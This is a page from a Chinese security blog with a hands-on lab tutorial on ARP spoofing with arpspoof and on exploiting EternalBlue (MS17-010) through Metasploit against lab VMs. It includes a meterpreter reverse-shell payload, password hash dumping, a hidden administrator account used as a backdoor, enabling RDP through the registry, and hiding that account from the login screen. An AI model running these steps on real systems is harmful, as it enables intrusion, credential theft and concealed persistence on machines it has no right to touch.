<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024213450091-1667183983062.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024213538997-1667183983062.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024214336815-1667183983063.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024221557692-1667183983063.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024222021184-1667183983063.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024222532234-1667183983063.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024225619939-1667183983063.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024231657266-1667183983063.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205181026360.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205181642408.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205181918331.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205182219730.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205194835809.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205183041664.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205182529927.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205183226044.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205182632497.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205183513015.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205190009628.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205190356946.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205191113963.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205191849216.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205192229426.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205193201487.png">
<meta property="og:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205193743545.png">
<meta property="article:published_time" content="2022-11-22T16:22:19.000Z">
<meta property="article:modified_time" content="2023-09-27T09:44:17.198Z">
<meta property="article:author" content="涩橙子">
<meta property="article:tag" content="渗透">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/1.png">

<link rel="canonical" href="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>渗透 and web | orangeの博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">orangeの博客</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">16</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">54</span></a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">39</span></a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
        <li class="menu-item menu-item-追番">

    <a href="/bangumis/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>追番</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://julintongxue.github.io/2022/11/23/%E6%B8%97%E9%80%8F-and-web/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/head.jpg">
      <meta itemprop="name" content="涩橙子">
      <meta itemprop="description" content="自己对技术的小小见解，如果有误，请轻点喷，作者会腾出时间修改错误！！！(写了"搁浅"两字的就是个空文档,望注意)">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="orangeの博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          渗透 and web
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-11-23 00:22:19" itemprop="dateCreated datePublished" datetime="2022-11-23T00:22:19+08:00">2022-11-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-09-27 17:44:17" itemprop="dateModified" datetime="2023-09-27T17:44:17+08:00">2023-09-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">攻防</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>52k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>48 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>[toc]</p>
<h1 id="渗透-and-web"><a href="#渗透-and-web" class="headerlink" title="渗透 and web"></a>渗透 and web</h1><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="ARP攻防"><a href="#ARP攻防" class="headerlink" title="ARP攻防"></a>ARP攻防</h3><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><p><strong>ARP即地址解析协议，在知道目标主机IP地址的情况下，如果需要得到目标知道的MAC地址，ARP协议即可以达到。如果该协议被恶意地对网络进行攻击，其后果是非常严重的。</strong></p>
<p><strong>ARP通常包括两个协议包，一个ARP请求包与一个ARP回应包，请求包如图2.37所示，ARP请求包是一个广播包，在ARP请求包中，源主机发出“Who has 192.168.1.2? Tell 192.168.1.128”。</strong></p>
<p><strong>如图：</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/1.png" alt="1"></p>
<p><strong>在ARP应答包中，源主机接收到目标主机发过来的应答包，“192.168.1.2 is at 00:50:56:ef:93:1d”，非常明了，也就是PC机192.168.1.2的MAC地址为00:50:6:ef:93:1d。常见的ARP欺骗有网关欺骗与主机骗两种：</strong></p>
<ul>
<li><p><strong>一种是对路由器ARP表的欺骗</strong></p>
<p><strong>ARP欺骗的原理是截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。</strong></p>
</li>
<li><p><strong>第二种是对内网PC的网关欺骗</strong></p>
<p><strong>第二种ARP欺骗的原理是伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，网络掉线了。</strong></p>
</li>
</ul>
<h4 id="ARP欺骗工具"><a href="#ARP欺骗工具" class="headerlink" title="ARP欺骗工具"></a>ARP欺骗工具</h4><p><strong>arpspoof是一款ARP欺骗工具，下面通过实验演示ARP欺骗，实验环境为攻击者为kali系统，IP地址为192.168.1.129，靶机为Windows 10，其IP地址为192.168.1.128，具体操作过程如下所示：</strong></p>
<p><strong>在kali系统中安装dsniff 嗅探工具：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install dsniff </span><br></pre></td></tr></table></figure>

<p><strong>安装完成之后我们可以使用<code>arpspoof</code>命令来攻击靶机(192.168.1.128)</strong></p>
<p><strong>然后我们在<code>VMware  Workstation</code>里面的【菜单栏】里面点击【编辑】向下找到【虚拟网络编辑器】，进到里面调配网络段使两台电脑在同一个局域网内。</strong></p>
<p><strong>进入【虚拟网络编辑器】之后点击【VMnet8】然后点击右下角的【更改设置】获取管理员权限，然后把左下角的子网ip更改为【192.168.1.0】，然后点击【确定】，然后两台设备(攻击者kali主机和靶机都在同一个局域网内了)</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/2.png" alt="2"></p>
<p><strong>在win10主机里面：</strong></p>
<p><strong>我们在控制面版里面找到【window Defender 防火墙】，点击进去后在左边找到【启用或者关闭 window Defender 防火墙】，把win10的防火墙全部关闭，便以我们接下来的实验。</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/3.png" alt="3"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/4.png" alt="4"></p>
<p><strong>我们首先打开攻击者kali系统，对局域网内的网段进行一次全局扫描来获取靶机的目标ip</strong></p>
<p><strong>打开kali后，右击桌面点击【Open Terminal Here】打开命令窗口。</strong></p>
<p><strong>在命令窗口输入：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/5.png" alt="5"></p>
<p><strong>(kali㉿kali)-[~&#x2F;Desktop]</strong><br><strong>└─$ nmap -sP 192.168.1.0&#x2F;24<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-11-03 05:25 EDT</strong><br><strong>Nmap scan report for 192.168.1.2       # 这个是网关ip</strong><br><strong>Host is up (0.00059s latency).</strong><br><strong>Nmap scan report for 192.168.1.128  # 这个是靶机ip</strong><br><strong>Host is up (0.0036s latency).</strong><br><strong>Nmap scan report for 192.168.1.129  # 这个是kali的ip</strong><br><strong>Host is up (0.0020s latency).</strong><br><strong>Nmap done: 256 IP addresses (3 hosts up) scanned in 2.77 seconds</strong></p>
<p><strong>然后获取我们局域网内的地址</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure>

<p><strong>kali㉿kali)-[~&#x2F;Desktop]</strong><br><strong>└─$ route</strong><br><strong>Kernel IP routing table</strong><br><strong>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</strong><br><strong>default         192.168.1.2     0.0.0.0         UG    100    0        0 eth0</strong><br><strong>192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0</strong></p>
<p><strong>通过上下对比，可以确定网关IP是192.168.1.2，靶机ip是192.168.1.128，那么前期的信息采集完成，我们接下来对目标靶机进行arp攻击。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth0 -t 目标ip 主机ip(路由器)      <span class="comment">#-i是指定网卡攻击，可以用ifconfig命令查看网卡 </span></span><br></pre></td></tr></table></figure>

<p><strong>这里我们使用这个命令</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth0 -t 192.168.1.128 192.168.1.2</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/6.png" alt="6"></p>
<p><strong>这个时侯的win10还能愉快的上网</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/7.png" alt="7"></p>
<p><strong>但是攻击命令按下去后，想打开网页都成为一种奢望</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/8.png" alt="8"></p>
<p><strong>取消kali的arp攻击(ctrl + c)后，win10的网络恢复正常</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/9.png" alt="9"></p>
<p><strong>我们来对比一下没被攻击前的win10的arp表和被攻击后的arp表的变化</strong></p>
<ul>
<li><strong>没被攻击前</strong></li>
</ul>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/10.png" alt="10"></p>
<ul>
<li><strong>被攻击后</strong></li>
</ul>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/11.png" alt="11"></p>
<p><strong>没攻击前的路由mac地址是【00-50-56-ef-93-1d】，被攻击后路由mac地址变成了【00-0c-29-c7-25-1a】</strong></p>
<p><strong>并且，还有一个特别有趣的地方就是【192.168.1.129】的mac地址和网关路由的mac地址完全一致，那么我们可以推断出上面那条攻击命令是把攻击者kali的mac替换了网关路由的mac</strong></p>
<h4 id="防范ARP攻击"><a href="#防范ARP攻击" class="headerlink" title="防范ARP攻击"></a>防范ARP攻击</h4><p><strong>虽然上面的攻击手段能达到断网、欺骗等效果，但是arp攻击已经是几十年的手段了，它有着种种局限性，例如：ARP攻击仅能在以太网进行，无法对外网进行攻击。</strong></p>
<h5 id="用命令完成防御"><a href="#用命令完成防御" class="headerlink" title="用命令完成防御"></a>用命令完成防御</h5><p><strong>原理：在上面我们知道arp工作原理是不断发送欺骗信息来对我们的arp变进行修改，那么我们可以使用手动配置的arp静态表来防止别人的arp欺骗攻击。（但是，静态配置的对不同的环境有着不好的兼容性，也就是说换一个地方工作，我们又要重新配一次静态arp，这样就会很麻烦，第二种办法则很好的解决这种问题，而且对新人非常友好。）</strong></p>
<p><strong>1、Win10以管理员身份运行<code>cmd</code>命令提示符</strong><br><strong>我们可以在Windows10系统的开始菜单上，单击鼠标右键，这时候出现的菜单中，我们选择命令提示符（管理员）点击打开这样即可。</strong><br><strong>2、首先，我们查询本地连接的网卡ID号</strong></p>
<p><strong>运行命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh i i show <span class="keyword">in</span></span><br></pre></td></tr></table></figure>

<p><strong>如下图所示：</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/12.png" alt="12"></p>
<p><strong>从上图可以知道，“Internet”的网卡ID为15，注意是我们需要的是<code>Idx</code>一栏而不是<code>Met</code>。</strong></p>
<p><strong>接下来用命令：arp -a来获取网关路由的ip地址和mac地址</strong></p>
<p><strong>3、绑定</strong><br><strong>在DOS界面运行命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh -c i i add neighbors 15 192.168.1.2 00-50-56-ef-93-1d       （这里的15就是查询到的本地网卡的ID）</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/13.png" alt="13"></p>
<p><strong>然后运行命令：arp -a查询是否绑定成功</strong></p>
<p><strong>绑定成功的标志就是右边的【动态】变成了【静态】</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/14.png" alt="14"></p>
<p><strong>4、单次解绑</strong><br><strong>之前通过arp–s方式手动绑定了网关MAC地址，通过arp–d清除该绑定即可。</strong><br><strong>arp -d 192.168.1.2</strong></p>
<p><strong>5、永久解绑</strong><br><strong>如过想解除绑定在CMD命令行程序里输入</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh i i reset </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/15.png" alt="15"></p>
<p><strong>不过需要重启才能生效。重启后本地IP地址、网关也要重新设置。</strong></p>
<h5 id="使用软件进行防护"><a href="#使用软件进行防护" class="headerlink" title="使用软件进行防护"></a>使用软件进行防护</h5><p><strong>国产软件360安全卫士里面有个实用的功能大全，里面的360流量防火墙可以对您局域网内的设备进行防护，刚入门的小白还是建议使用软件辅助学习会更加事半功倍。</strong></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/16.png" alt="16"></p>
<h3 id="永恒之蓝攻击"><a href="#永恒之蓝攻击" class="headerlink" title="永恒之蓝攻击"></a>永恒之蓝攻击</h3><h4 id="ms17-010-eternalblue"><a href="#ms17-010-eternalblue" class="headerlink" title="ms17_010_eternalblue"></a>ms17_010_eternalblue</h4><p>本次实验有两台设备，Kali Linux(攻击机) ip:192.168.110.132、Windows 7(靶机) ip:192.168.110.133</p>
<p>注意：实验前确认靶机的防火墙已经被关闭</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 收集目标系统信息</span></span><br><span class="line">nmap -T4 -A 192.168.110.133</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720013732287.png" alt="image-20220720013732287"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启msf对靶机进行渗透</span></span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720013841932.png" alt="image-20220720013841932"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720014154283.png" alt="image-20220720014154283"></p>
<p>首先我们先检查靶机是否能被永恒之蓝所攻击</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010  <span class="comment">#使用模块</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.110.133              <span class="comment">#设置目标</span></span><br><span class="line">show options                            <span class="comment">#查看所需参数是否齐全</span></span><br><span class="line">exploit                                 <span class="comment">#执行攻击，和run一样</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720014955490.png" alt="image-20220720014955490"></p>
<p>检测出可以被永恒之蓝攻击,我们调用第一个模块</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换exploit/windows/smb/ms17_010_eternalblue模块</span></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># 切换模块之后，下方有提示说要设置windows/x64/meterpreter/reverse_tcp的载荷</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入入远程打印机服务进程(这一步要不要都没关系)</span></span><br><span class="line"><span class="built_in">set</span> processinject spoolsv.exe</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.110.133              <span class="comment">#设置目标</span></span><br><span class="line">show options                            <span class="comment">#查看所需参数是否齐全</span></span><br><span class="line">exploit                                 <span class="comment">#执行攻击，和run一样</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020217575.png" alt="image-20220720020217575"></p>
<p>win已经成功注入和利用永恒之蓝，接下来我们查看目标ip和其他信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020403916.png" alt="image-20220720020403916"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020446575.png" alt="image-20220720020446575"></p>
<p>找到密码hash，用MD5解密</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020537658.png" alt="image-20220720020537658"></p>
<p>管理员的密码到手^_^</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo   <span class="comment">#查看系统信息</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020857128.png" alt="image-20220720020857128"></p>
<p>也可以用shell直接操控远程cmd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720020649396.png" alt="image-20220720020649396"></p>
<p>进入shell可以给自己创建私人用户，并且授予权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user julintongxue$ 123456 /add    <span class="comment">#创建一个隐藏用户</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720021820959.png" alt="image-20220720021820959"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators julintongxue$ /add    <span class="comment">#授予管理员权限</span></span><br><span class="line"><span class="comment"># 输入exit回到控制台，然后hashdump看一下权限</span></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">julintongxue$:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line"><span class="comment"># 我的权限和管理员的权限一模一样</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720022302734.png" alt="image-20220720022302734"></p>
<p>回到kalilinux主机里面，使用rdesktop远程登陆靶机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.110.133</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720022426306.png" alt="image-20220720022426306"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220720022438311.png" alt="image-20220720022438311"></p>
<h4 id="注册表开启3389"><a href="#注册表开启3389" class="headerlink" title="注册表开启3389"></a>注册表开启3389</h4><p>如果rdesktop登不进去的话，你得看看你在信息收集的时候，看看靶机的3389端口是否开启！！！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（输入命令为修改系统注册表，开启 3389 端口）</span><br><span class="line">C:\Windows\system32&gt;reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="string">&quot;0&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p>呵呵，不要学我，你们可以在msf的shell里面修改win7的注册表即可。。。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721225610024.png" alt="image-20220721225610024"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721225822146.png" alt="image-20220721225822146"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721225956759.png" alt="image-20220721225956759"></p>
<h4 id="隐藏不想显示的特定账户在登录界面"><a href="#隐藏不想显示的特定账户在登录界面" class="headerlink" title="隐藏不想显示的特定账户在登录界面"></a>隐藏不想显示的特定账户在登录界面</h4><p>这样在人家那边在登录的时候可以看出我们创建的隐藏账号的登录痕迹，即下图：</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-07-21_22-03-09.png" alt="Snipaste_2022-07-21_22-03-09"></p>
<p>我们不可以留这种把柄给别人。。。那么得修改一下注册表，隐藏不想显示的特定账户在登录界面</p>
<p>按住键盘<code>win+r</code>唤出<code>运行</code>,在窗口里输入<code>regedit</code>调出注册表</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721221751469.png" alt="image-20220721221751469"></p>
<p>在打开的注册表编辑器中 依次展开“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220721222142774.png" alt="image-20220721222142774"></p>
